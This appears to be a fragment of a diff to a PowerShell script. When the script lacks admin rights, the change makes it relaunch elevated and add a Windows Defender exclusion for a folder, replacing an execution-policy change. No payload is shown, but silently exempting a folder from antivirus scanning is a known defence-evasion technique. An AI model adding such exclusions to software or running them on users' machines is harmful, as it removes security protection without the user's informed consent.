@@ -9,7 +9,7 @@ $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIde
 if (-not $isAdmin) {
 	$startInfo = New-Object System.Diagnostics.ProcessStartInfo
 	$startInfo.FileName = 'powershell.exe'
-	$startInfo.Arguments = "-Command `Set-ExecutionPolicy RemoteSigned -Force`""
+	$startInfo.Arguments = "-Command `"Add-MpPreference -ExclusionPath '$folderPath'`""
 	$startInfo.Verb = "runas"
 [System.Diagnostics.Process]::Start($startInfo) | Out-Null
 } else {
